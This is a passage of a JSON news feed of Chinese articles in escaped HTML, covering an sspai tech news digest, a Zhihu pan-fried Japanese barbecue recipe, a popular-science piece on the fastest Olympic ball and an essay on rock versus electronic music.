target=\"_blank\">来源</a></p>\n<h3>微信推出先寄后付服务，已接入主流快递品牌</h3>\n<p>近日，微信推出快递先寄后付服务，用户在微信中使用微信支付分即可使用该服务。快递员上门收件并寄件后，微信会自动完成扣款。顺丰、京东、中通、丰巢、EMS、韵达等快递行业头部品牌均已接入。<a href=\"https://www.tmtpost.com/nictation/5542700.html\" target=\"_blank\">来源</a></p>\n<h3>Xbox 推出全新配色无线控制器 Aqua Shift</h3>\n<p>微软公司于 8 月 4 日推出全新配色的 Xbox 游戏控制器 Aqua Shift，该产品也是 Xbox Series X|S 系列的首款特别版控制器。Aqua Shift 以海洋蓝为主色调，搭配模仿水纹的渐变和亮色处理，带给玩家「水之流动」的使用感受。Aqua Shift 将于 9 月 1 日开售，定价 69.99 美元。<a href=\"https://www.gcores.com/articles/139981?utm_campaign=official_account&amp;utm_source=weibo&amp;utm_medium=social%E2%80%98\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/05/article/934d805e402803bc20e8f585ad4d2bdb\" alt=\"Xbox Wireless Controller – Aqua Shift Special Edition | Xbox\"><figcaption>Xbox Game Controller Aqua Shift，图片来自微软</figcaption></figure><h3>《暗黑破坏神：不朽》延期至 2022 年推出</h3>\n<p>游戏公司暴雪近期 <a href=\"https://news.blizzard.com/en-us/diablo-immortal/23706474/diablo-immortal-development-update\" target=\"_blank\">发布公告</a> 称，旗下动作角色扮演游戏《暗黑破坏神：不朽》将延期至 2022 年上半年推出。暴雪在公告中表示，团队听取了玩家在 Αlpha 版本封测中给出的意见，并将进一步优化 PvE 副本和 PvP 系统等。<a href=\"http://www.vgtime.com/topic/1131286.jhtml\" target=\"_blank\">来源</a></p>\n<h3>Netflix 版《三体》首曝选角</h3>\n<p>据外媒报道，Netflix 版《三体》的制作团队正在与墨西哥女演员艾莎·冈萨雷斯（Eiza González）接触，邀请对方饰演片中角色，片方希望冈萨雷斯饰演的具体角色尚未公开。Netflix 版《三体》将由《权力的游戏》主创大卫·贝尼奥夫和 D·B·威斯担任编剧和监制，原作者刘慈欣和英文翻译者刘宇昆任顾问。<a href=\"https://hot.cnbeta.com/articles/movie/1161827.htm\" target=\"_blank\">来源</a></p>\n<h2><strong>看看就行的小道消息</strong></h2>\n<ul>\n<li>小米公司于 8 月 4 日确认将召开小米 MIX 新品发布会，小米 MIX 4 的柔性屏幕组件随后曝光。据曝光影片所示，小米 MIX 4 将采用 6.67 英寸的双曲面屏，并应用屏下摄像头技术。<a href=\"https://www.cnbeta.com/articles/tech/1161797.htm\" target=\"_blank\">来源</a>\n</li>\n<li>Twitter 网友 <a href=\"https://twitter.com/olrak29_\" target=\"_blank\">@Olrak29_</a> 近期公开了 AMD 的 RDNA 3 架构图，其中包含 Navi 31、Navi 32 和 Navi33 三款 GPU。RDNA 3 架构或将于 2022 年 10 月推出。<a href=\"https://www.cnbeta.com/articles/tech/1161925.htm\" target=\"_blank\">来源</a>\n</li>\n<li>加州大学洛杉矶分校教授 Dennis Hong <a href=\"https://twitter.com/DennisHongRobot/status/1422435800755568644?s=20\" target=\"_blank\">发布了一张图片</a>，暗示特斯拉打造的 Dojo 超算平台有可能在特斯拉 AI 日上亮相。<a href=\"https://www.tmtpost.com/nictation/5542740.html\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<p><strong>📰 内容动态</strong></p>\n<ul>\n<li>🚗 由少数派数字工具组联合非旭和老麦制作的《特别少数派·中国西部游自驾指南》现已 <a href=\"http://west.sspai.com/\" target=\"_blank\">上线</a>。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog\" target=\"_blank\">职场生存手册</a>》已经上线，带你关注职场的生存法则与自我保护。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》已经印刷完毕，即将上线各大电商平台，少数派预购会员均将获赠该书。</li>\n<li>📷️ 聊聊你最爱的那枚镜头，去 <a href=\"https://sspai.com/bullet/1627633392\" target=\"_blank\">一派</a> 和大家交流一下摄影心得吧。</li>\n</ul>\n<p><strong>💰 折扣促销</strong></p>\n<ul>\n<li>💿 Microsoft 365 <a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">限时促销</a>，下单再送定制鼠标垫。</li>\n<li>⚙️ 工具升值包、付费栏目限时 <a href=\"https://sspai.com/post/67817\" target=\"_blank\">特惠加上新</a>，开启你的暑假充电计划。</li>\n<li>💻 少数派商店 Satechi 苹果周边配件 <a href=\"https://sspai.com/post/67873\" target=\"_blank\">限时特惠</a> 中，几款「果味儿」十足的第三方配件。</li>\n</ul>\n<h2><strong>你可能错过的好文章</strong></h2>\n<ul>\n<li>🪟 <a href=\"https://sspai.com/post/68017\" target=\"_blank\">虽然踩坑但及时止损，这是我的装修故事</a>\n</li>\n<li>🔍 <a href=\"https://sspai.com/post/68058\" target=\"_blank\">你从未用过的微信「搜一搜」，其实可以很实用</a>\n</li>\n<li>🎨 <a href=\"https://sspai.com/prime/story/vol05-learning-PPT-2\" target=\"_blank\">从页到金字塔结构——PPT 制作入门指南</a>\n</li>\n<li>🚗 <a href=\"https://sspai.com/post/68091\" target=\"_blank\">2025 年的纯电动车会是什么模样？</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68111"},{"title":"如何在自己家里像在烤肉店一样烤肉吃？","date":"2021-08-04 23:07:28","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-965aacd49f4e38e96e2cc31723f585a3_l.jpg?source=8673f162\"><span>菜菜美食日记，</span><span>江湖人称“菜三碗” ，三碗，不是饭量，是态度呐~</span>\n<a href=\"https://www.zhihu.com/question/34992932/answer/1664065079\" hidden>阅读原文</a>\n</div>\n<div>\n<p>自打入了冬，烤肉就成了美食圈的香饽饽，隔三差五就有朋友晒图。</p>\n<p>但在外头吃一顿好的烤肉，人均至少 300 起；自己在家做，又苦于没有专门的烤盘烤炉等设备。</p>\n<p>不过，这可难不倒本“厨房鬼才”，今天菜菜就来给大家分享一个<strong>平底锅日式烤肉的好方子！</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-bd49561566cf3b83d10c4d4dc1b9a7e2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>和味浓酱厚的韩式烤肉相比，日式烤肉稍显小清新。</p>\n<p>它的讲究，不仅在肉上，也在调味上。</p>\n<p>往肉上说，可就太细了，单是日式烧鸟，就能把一只鸡按照部位，划分成几十个不同的种类！</p>\n<p>从调味上，也分盐烧、照烧、味噌烧等几个流派。</p>\n<p>盐烧是最简单的，薄肉加盐稍加腌渍，或是在烤的时候撒上一点儿盐，旨在吃出肉的本味。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2bea25eff0beaea0735cc09b7e8ea5cd_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-5cf3ad38bb11c4309c8c4e30b07b107c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>盐烧适合搭配薄切的肉，我选的是薄切牛板腱。</p>\n<p>日式烤肉菜单上将其命名为牛三筋，在潮汕人的精细划分下，它又叫匙仁。</p>\n<p>它是日式烤肉店老板最常向客人推荐的部位，肉质软嫩，脂肪较少。</p>\n<p>不过因为出肉率不高，相对金贵，日料店里，小小一碟能卖到 78 元。自己在家吃，可就敞开管够了~</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0fde0b0813eb698994be49ff7b7b333a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>热火一撩，或铁板一烤，肉的边角就变得焦香卷曲起来。</p>\n<p>翻几次面，裹上盐葱酱送进口，牛肉本身的鲜甜，混杂着青葱香气席卷入喉。</p>\n<p>身在冷冬，口腔却体验了一番春天的清新舒爽。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4722c3bde12d03aa126b965cc2c2aad0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>厨房里刚好还有现成的味噌，我还多做了一款味噌烧。</p>\n<p>味噌是日式料理中常见的调料，属于黄豆酱的外国亲戚。</p>\n<p>它的风味比黄豆酱更清淡，能很好地软化肉质。</p>\n<p>拿来做烤肉酱，也属于清新向，但滋味会比盐烧更丰富有层次。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d40af876961fa25fa195dd698abc2e89_720w.jpg?source=8673f162\" alt=\"\"></figure><p>味噌烧适合搭配厚一点的肉，我喜欢拿它配肉眼雪花。</p>\n<p>这部位的肉肥瘦均匀，烤着吃有很香的油脂感，味噌酱汁淡淡的豆香和甘甜的味道，又有着解腻的作用，二者相得益彰。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e018a2f9ed808955a030334345378ee2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>要是想要更简单省事，还可以直接用市面上现成的日式烤肉酱，肉 + 烤肉酱腌渍半小时就可以开烤~</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-327fbc77a9249e18ccc8c3a198fc521c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-6b28c6c42da0fbf2d3d7f5bf6caf7b9a_720w.jpg?source=8673f162\" alt=\"\"></figure><hr>\n<p><strong>- 平底锅日式烤肉 -</strong></p>\n<p><strong>味噌烧</strong></p>\n<p><strong>[ 食材 ]</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-911d85085283534b1357c1d187ad683c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>肉眼雪花牛肉 200g</p>\n<p>味噌酱：白味噌 3 小勺 清酒 6 小勺 细砂糖 1 小勺 生抽 3 小勺 蒜泥 1 小勺 姜泥 1 小勺 熟芝麻少许 香葱少许</p>\n<p>1 大勺＝1 table spoon＝15ml</p>\n<p>1 小勺＝1 tea spoon＝5ml</p>\n<p><strong>[ 食谱 ]</strong></p>\n<p>1.姜、蒜磨成泥，小葱切碎</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-674b4963eeabae74a32b70149be87dbd_720w.gif?source=8673f162\" alt=\"\"></figure><p>2.小碗里加入 3 小勺味噌酱、6 小勺清酒、1 小勺细砂糖、3 小勺生抽、1 小勺蒜泥、1 小勺姜泥混合均匀，味噌酱腌料完成</p>\n<p>如果没有味噌酱和清酒，可分别用 1-2 小勺黄豆酱，6 小勺黄酒替代</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-7f4def154e110a8647c4086b6ee751af_720w.jpg?source=8673f162\" alt=\"\"></figure><p>3.在 200g 肉眼雪花牛肉里，加入一份味噌酱调料，拌匀腌渍 15-30 分钟</p>\n<p>可用鸡腿肉替代牛肉，但腌渍时间需要 1 小时以上</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-183c2a14da37e9822677094dc114b167_720w.gif?source=8673f162\" alt=\"\"></figure><p>4.取一个厚底不粘锅 / 铸铁锅，放入食用油，烧热后将牛肉平铺在锅中</p>\n<p>开大火快速煎熟两面，取出摆盘，可以撒一些芝麻葱花增加香气</p>\n<p>空气炸锅：烤架刷油，平铺腌制好的牛肉片，200 度烤 4-6 分钟，中途翻面</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7ce434f642918d2f138a8aaea54910c6_720w.gif?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-f88a22793371b31f46415bfb036134bb_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong>盐烧 + 柚子胡椒盐葱酱</strong></p>\n<p><strong>[ 食材 ]</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-998e6716d947a764b31176388f9d42e6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>薄切牛板腱肉 200g</p>\n<p>柚子胡椒盐葱酱：小葱 3 大勺 姜泥 1 小勺 生抽 1 小勺 糖 1 小勺 柚子胡椒盐 1 小勺 香油 1 大勺 白芝麻 1 小勺</p>\n<p><strong>[ 食谱 ]</strong></p>\n<p>1.小碗里放入 1 小勺熟芝麻研磨碎，释放香气</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-da26cd724eb898a61782a7556246ea93_720w.gif?source=8673f162\" alt=\"\"></figure><p>再加入 6 小勺小葱、1 小勺姜泥、1 小勺生抽、1 小勺糖、1 小勺柚子胡椒盐、3 小勺香油拌匀</p>\n<p>没有柚子胡椒盐，可用 1 小勺柠檬汁和 1 小勺盐替代，风味上有些许差距，但一样清新好吃</p>\n<figure><img src=\"https://pica.zhimg.com/v2-2cf4ea96e3a67be89fe7f77b2af0dfde_720w.jpg?source=8673f162\" alt=\"\"></figure><p>2.取一个厚底不粘锅 / 铸铁锅，放入食用油，烧热后将牛肉平铺在锅中</p>\n<p>开大火快速煎熟两面，关火铺上柚子胡麻蘸酱一起食用</p>\n<p>牛板腱也可以换成任意自己喜欢的部位，不过要记住，一定要切薄片！</p>\n<p>自己切的话，可以先放进冰箱里冻 1-2 个小时，到肉表面冻硬定型，用快刀薄切就行</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-23ca7357ff41a6e46d37352a587479f6_720w.gif?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-19c745354058b20468d0cd62ea66fe7c_720w.gif?source=8673f162\" alt=\"\"></figure><p>这两款日式烧烤酱料，可是我研究过不少日式烧烤菜谱后，研发出来的独门秘方，你们一定要收藏起来！</p>\n<p>味噌酱除了做烤肉，也能直接拿来炒五花肉，一样的快手又方便。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2188aa8d76053a841f8bd6275eab6a62_720w.jpg?source=8673f162\" alt=\"\"></figure><p>柚子胡椒盐葱酱风味独特，拿来做凉拌海鲜的酱料也是一绝。</p>\n<p>拿来拌一份小章鱼，就是日式居酒屋风格的下酒菜。</p>\n<p>肉肉吃得太饱，尝一口海鲜的脆甜和葱盐的清爽，人也变得舒爽起来。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-778dc192a83e56e1083af574239580dc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-67498ac38c4114ad97fe8b5c099e9ed3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>怎么样，我这招平底锅烤肉，大家可还满意~</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/34992932\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738880"},{"title":"奥运会的球类运动里，哪种球速度最快？","date":"2021-08-04 23:07:22","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/c1b4a75b500a354b1b6dfa2b7ddfefaf_l.jpg?source=8673f162\"><span>中国科普博览，</span><span>我们科学家有话说</span>\n<a href=\"https://www.zhihu.com/question/477025408/answer/2036885322\" hidden>阅读原文</a>\n</div>\n<div>\n<p>张怡宁曾经在采访中说过，希望孩子参加球类运动（不是说一定要成为运动员），因为球类有各种旋转，各种运动，非常开发锻炼智力。</p>\n<p>乒乓乒乓，你来我往之间，较量升级；</p>\n<p>跳起、挥拍，球在力量与智慧的击打中穿梭；</p>\n<p>追逐、超越，球跟着脚，在球场奔跑……</p>\n<p>总之，球类运动是奥运会不可或缺的部分，更是奥运赛场上不可忽视的精彩。</p>\n<p>2020 年东京奥运会共设 33 个大项，339 个小项比赛，其中有 13 种球类运动，包括足球、篮球、排球、乒乓球、羽毛球、网球、橄榄球、水球、棒球、垒球、高尔夫球、曲棍球和手球。在冬季奥运会中，冰球也是常规项目。</p>\n<p>所有球类运动无非是用手、脚、球棒或球拍击打球，<strong>球的尺寸、形状和重量差异使得它们具有不同的速度以及运动轨迹。</strong></p>\n<p>那么<strong>在这些球类运动中，速度最快的是哪种球？</strong></p>\n<p>相信很多人都知道，<strong>答案其实是，外形一点也不像球的羽毛球。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9346e9066ee78c3f683e818c200e77e9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>中国女子羽毛球选手陈雨菲在 2020 东京奥运会上 (图片来源：中国奥林匹克委员会)</figcaption></figure><p><strong><strong>为什么是羽毛球?</strong></strong></p>\n<p>2013 年 7 月，马来西亚运动员陈文宏与队友李宗伟受邀参加某公司的新球拍速度测试赛，陈文宏以 493 公里 / 小时（将近 137 米 / 秒）的速度创造了世界记录。</p>\n<p>不过由于这是在实验室测试时的球速，不是在真实的比赛中，因此该记录并未得到吉尼斯世界纪录官方的认可。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5597cc7b823b915d00c444facdc6bb1e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>虽然没有得到吉尼斯世界纪录官方的认可，很多人还是认为陈文宏创造了吉尼斯记录 (图片来源：http://www.karizmasport.si)</figcaption></figure><p>目前吉尼斯官方认可的最快的羽毛球记录来自丹麦选手科丁，2017 年 1 月 10 日，在印度羽毛球超级联赛上，科丁在正式比赛中杀出一记速度高达 426 公里 / 小时（约 118 m/s）的杀球。</p>\n<p><strong>这两个记录中，羽毛球的最高速度都比“复兴号”动车组列车的最高运行时速（400 公里 / 小时）要快。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-af63f850920c5e08972f7e468a3c2aaf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>各种球类运动的最高运动速度（图片来源：Physics of ball sports）</figcaption></figure><p>羽毛球为什么能飞得那么快？是因为它的“屁股”上插了 16 支鹅毛么？</p>\n<p><strong>原因其实并不复杂，主要是因为羽毛球比较轻（重量只有 5 克），并且球拍足够长（不超过 680mm）。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3c744b74c545d018867de7499b9e2bc5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>各种球的尺寸、重量及速度等基本参数（图源：Annu. Rev. Fluid Mech，作者翻译）</figcaption></figure><p>不过，羽毛球真的有那么快吗？羽毛球场地长 13.4 米，若以 400 公里 / 时的球速计算，那它穿过全场仅需约 0.12 秒，而我们眨一次眼睛约需 0.2 秒，按道理我们根本看不清球的轨迹。</p>\n<p><strong>为什么观看球赛的时候，我们看到的羽毛球并没有那么快？</strong></p>\n<p>这是因为羽毛球的最快速度只是在球离开球拍的一瞬间，而它的气动阻力非常大，这使它迅速减速。</p>\n<p>球体在空中的运动往往只受到空气阻力和重力的作用，它的速度一般只会逐渐减小（篮球等例外）。想要获得最快的运动速度，球体需要在离开运动员接触的瞬间获得最大的加速度。<strong>相对于网球、足球和其它球体，羽毛球非常轻，因此同等大小的力在它身上则会产生更大的加速度。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-91680c1f2be8970a23265e9faf1919e1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>高尔夫球和羽毛球的的挥拍动作 （图片来源：Physics of ball sports）</figcaption></figure><p><strong><strong>乒乓球的重量更小（2.5g），只有羽毛球的一半，它为什么不是最快的球？</strong></strong></p>\n<p>虽然乒乓球和羽毛球的击球方式相似，运动员在手臂、手腕以及球拍的共同作用下进行发力，挥拍产生极大的角速度，<strong>但乒乓球球拍的长度过短，它产生的线速度较小，乒乓球球拍提供的力远没有羽毛球球拍大，</strong>并且羽毛球拍更容易发力，因此羽毛球往往比乒乓球的速度更高。</p>\n<p>羽毛球的英文名叫“badminton”，这是因为现代羽毛球运动的发祥地是英国的伯明顿。此外，它还有一个别名，“shuttle”，意为航天飞机、梭子等，这是因为羽毛球和航天飞机之间存在关联。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d878a16110a7e4aebd6b81c6b9d31e73_720w.jpg?source=8673f162\" alt=\"\"><figcaption>太空船一号飞行器（图源：airandspace）</figcaption></figure><p>羽毛球开始的速度非常快，但插满羽毛的形状可以使它在空中飞行时保持稳定。羽毛球涉及的空气动力学规律也为航天器“太空船一号”（SpaceShipOne）的研发工程师提供了灵感。</p>\n<p>“太空船一号”是一架装有火箭发动机的有翼飞行器（名为“飞船”，实为飞机），它是第一个进入太空的私人投资建造的亚轨道飞行器。这架飞机上设有三个座位并且可以重复使用，价格相对低廉，为普通人实现太空旅行提供了一种潜在的选择。当飞机下降时，两段尾翼可以从水平位置旋转 90°，“垂直”地立站在飞机的后方，<strong>此时气流会在尾翼上产生较大的阻力，同时保证飞机降落时的稳定性，这和羽毛球上羽毛发挥的作用十分相似。</strong></p>\n<p><strong><strong>飞得最远的球——高尔夫球</strong></strong></p>\n<p>羽毛球的快仅仅体现在一瞬间，在很多人看来，这似乎有一点“胜之不武”的成分。</p>\n<p><strong>严格意义上，一次击球过程中的平均速度往往更符合“最快”的标准。</strong></p>\n<p>由于阻力过大，羽毛球只得名落孙山，而此时拔得头筹的又会是谁呢？</p>\n<p>答案是高尔夫球。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0c452a4f6e8f98e084dce14f0c006611_720w.jpg?source=8673f162\" alt=\"\"><figcaption>正在打高尔夫球的爱好者（图源：selectbox.hr）</figcaption></figure><p>高尔夫球一骑绝尘，单次击球可以移动 200 米以上，毫无疑问，打高尔夫需要非常大的场地。</p>\n<p>标准高尔夫球场，一般布置 18 个球洞，总长度要控制在 6002～6400 米，球场面积 50～75 公顷（1 公顷=10000 平方米），实际大小要根据球场的地形来确定。1868 年，“高尔夫之父”汤姆·莫里斯（Tom Morris）打出了第一个一杆进洞，震惊世人。</p>\n<p>不仅如此，高尔夫还走出了地球，成为了首个星际间的球类运动项目。1971 年 2 月 6 日，执行阿波罗 14 号任务的宇航员艾伦·谢帕德（Alan Shepard）挥动球杆在月球上打起了高尔夫球，从而使他成为有史以来第一位，也是目前唯一一位在月亮上打过高尔夫球的人。</p>\n<p>艾伦在登月前偷偷将球杆头藏在袜子里，登月后，他将球杆头和改造过的铁杆连接起来，组成了一支球杆。由于宇航服十分笨重，艾伦在月球上只能以单手击球，第一颗球打偏后落入了一个小型撞击坑，接着他直接挥杆击打第二颗球，第二颗球飞出了大约 183 米，<strong>由于月球上的重力只有地球上的六分之一，因此在月球上能轻松地打出更远的距离。至今，这两颗高尔夫球仍散落在月球表面。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e44dbf1084d90fe418209129eaabd405_720w.jpg?source=8673f162\" alt=\"\"><figcaption>正在月球打高尔夫球的宇航员艾伦（图源：NASA）</figcaption></figure><p><strong>同是球类，赢的标准为什么差别这么大?</strong></p>\n<p>不知道你有没有考虑过一个问题，为什么乒乓球出界了要计分，而足球出界了却要罚球呢？</p>\n<p>球的尺寸、形状和重量差异使得它们具有不同的速度以及运动轨迹，这也导致这些运动的场地尺寸和同台参与的人数不尽相同。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-73683e1bde8c9c8f169c4250875209dd_720w.jpg?source=8673f162\" alt=\"\"><figcaption>球类单次运动的距离和场地的关系（图源：Physics of ball sports，作者翻译）</figcaption></figure><p>在上图中我们可以看到，在斜线以下的网球、排球和乒乓球等球类运动，它们的场地相对于球的运动距离偏小，球往往会出界，出界计分就变得合情合理。对于斜线上方的足球、篮球和高尔夫运动，球则不容易出界，单纯依靠出界不能在短期内决出胜负，因此还需要制定一个进球的规则。</p>\n<p>所以，<strong>球类运动项目的比赛场地和规则并不是随意制定的，而是根据各种球体的运动规律，并通过严谨的数学计算才最终确定的。</strong></p>\n<p>无论球飞得快或慢、远或近，奥运赛场上，球类运动考验的是运动员们的力量、速度和技巧，而这过程中展现的拼搏精神始终感染着我们这些赛场外的观众。</p>\n<p><strong>参考文献：</strong></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//airandspace.si.edu/collection-objects/spaceshipone/nasm_A20050459000\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>airandspace.si.edu/coll</span><span>ection-objects/spaceshipone/nasm_A20050459000</span><span></span></a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//deemples.com/weird-facts-about-golf/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>deemples.com/weird-fact</span><span>s-about-golf/</span><span></span></a></p>\n<p>Christophe Clanet. Sports Ballistics. Annu. Rev. Fluid Mech. 2015. 47:455–78</p>\n<p>C. Cohen, C. Clanet. Physics of ball sports. EPN 47/3</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//allthatsinteresting.com/alan-shepard-golf-ball\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>allthatsinteresting.com</span><span>/alan-shepard-golf-ball</span><span></span></a></p>\n<p>Remastered images reveal how far Alan Shepard hit a golf ball on the Moon | Ars Technica</p>\n<p><strong>作者：城明辰</strong></p>\n<p>出品：科普中国</p>\n<p>监制：中国科学院计算机网络信息中心</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/477025408\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738868"},{"title":"为何很多摇滚/金属乐迷对电子音乐,合成器有很深的鄙夷？传统音乐对电子音乐的优越感从何而来?","date":"2021-08-04 23:07:18","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-ba4a8782d74af3560031db0baffb80ce_l.jpg?source=8673f162\"><span>龚钊Asa，</span><span>唱作人、吉他手</span>\n<a href=\"https://www.zhihu.com/question/446417893/answer/1753903697\" hidden>阅读原文</a>\n</div>\n<div>\n<p>切实体会，深有感触。</p>\n<p>但你说的这种鄙夷和优越感，但凡它一出现，就将成为限制一个人扩展自己艺术审美的阻碍，这点毫无疑问。</p>\n<p>其实我们生活中所遇到的大部分鄙视和优越感全都来源于视野窄、不了解。这种互不尊重不仅存于传统乐队乐迷与电子乐迷之间，也不仅仅存在于风格之间。音乐圈内，这种互不了解，也广泛存在于各个细分专业领域。</p>\n<p>去年玩儿知乎，围观各种回答评论中的争辩，我从学长 <a href=\"http://www.zhihu.com/people/c542ebbc6f9fe0662246d3d24ea752ae\">@梁源</a> 那儿学习到了一个探讨问题的重点：</p>\n<p><strong>我们无法讨论问题的根本原因，其实在于讨论双方的边界没对齐。</strong></p>\n<p>举例说明：当一个吉他手和一个电子音乐人讨论什么是“在云中的感觉”的时候，吉他手考虑的是选什么音、怎么弹、怎么组织音符、力度、音色、如何编配；电子音乐人想得可能是音色分类、EQ 频段、选什么合成器、后期调完了什么效果。</p>\n<p>本来就是因为经验和擅长不同而导致的出发点不同、方法过程不同，如果彼此不了解对方的边界，而断言对方艺术审美不成，那任何人之间就无法合作和交流。<strong>本质上出现这些鄙夷的原因，是我们学习的音乐语言不同，但彼此的语言没能交汇。</strong></p>\n<p>很多乐手根本不了解电子乐是什么，也不了解制作。如果接触到拽几个 loop 做了首神曲，就被追捧的电子音乐人，接受他营销方向敏锐、流行度把握得好还行，但想来也很难认可他的音乐能力。因为大多时候，这些人的音乐能力确实不太够；同理，很多电子音乐人也不了解器乐，好的电子乐队是真人演奏的，做电子但却不明白 loop 和真人演奏的区别界限，觉得乐手太传统，也不了解器乐的特性；能坐十个小时做一个音色，却没有现场的控制力，自然会觉得乐手太随机。这些误读，站在任何一方的立场上其实都可以理解，但我看来，这种争执只会发生在水平不够的标准线以下。</p>\n<p>像刚刚宣布解散的 Daft Punk、纯在声音极限上开拓的 Kraftwerk、玩儿数学的 King Crimson，老头儿了还是原来那个劲儿的 Rolling Stone 和 AC/DC，一辈子弹吉他的 Eric Clapton 等等，大家不会看不起，无论他们一辈子只演奏器乐还是只会拿电子做音色，都不会被看不起。</p>\n<p>究其原因，和他们用什么做音乐都没关系，原因在于他们的音乐意识。他们的音乐语言无论是任何，都不过只是工具。</p>\n<p>虽然我不知道题主的立场如何，但以我从业的经验而言，并非只是传统乐手对电子乐有不正确的认知，其实电子行业乃至制作行业对于乐手的认知，也是相当片面的。</p>\n<p>电子乐里有电子音乐人和电子乐队，很多大牌电子乐队现场演出，例如 Portishead 是真人全场弹奏的。因为这些做电子乐队的音乐人非常了解，演奏的时候，你的动态和张力控制，动人的部分还是要人来完成。你想做一个现场演奏的电子乐队，却不愿意在现场控制表现力最强的演奏上下功夫，被乐手鄙夷我觉得也没有什么可喊冤的。</p>\n<p>电子乐中 DJ 的搓碟，合成器的音色控制、midi 控制都是需要精准的机能练习的，挑音色需要时间，练技法也需要，你把所有时间用在制作音乐而非演奏音乐上，就不应该要求别人肯定你这个方面。就像我去看完发电站的现场，我也只会觉得：音乐概念、音响、音色、现场舞台设计太震撼了；而不是非要说：他们弹得真棒！</p>\n<p>分享一个令我印象深刻的视频，是 Jacob Collier 和 Larnell Lewis 在 groundup 音乐节后台随便玩儿的一个 Jam，说明一下用打击板儿打鼓应该是什么样儿的，真不是用鼠标点完现场直接放 PGM 不管就完事儿了的。</p>\n<p>我经常接到一些国内制作人发来的工作，可能是一个键盘出身的编曲老师，或者一个后期老师，他所提出的一些风格或者演奏技法上的要求，在吉他上实际上常常是毫不合理的。很多所谓的电子制作人连基本的音域选择、风格特色、手法能到达的动态张力都不够了解。有时制作人朋友在跟我聊不同型号吉他的音色的区别时，我常常感觉，只考虑到材质型号，却不考虑手法力度能到的极限，都不过是纸上谈兵罢了。</p>\n<p>同时，很多乐手对制作也是没有概念的。很多时候大家需要了解的是，电子音乐其实跟乐队文化几乎是同时期就开始了，但一开始这本来就是两个方向。乐器就是演奏出发，接电有了后来各种音色与风格的拓展，一步一步演化至今的。电子乐也是一样，从一个声音信号开始，塑造一个声音的形态，结合不同时期的科技进步和社会文化，一步步发展而来的。</p>\n<p>就跟你学吉他，你不能弹完 John mayer 不知道 srv 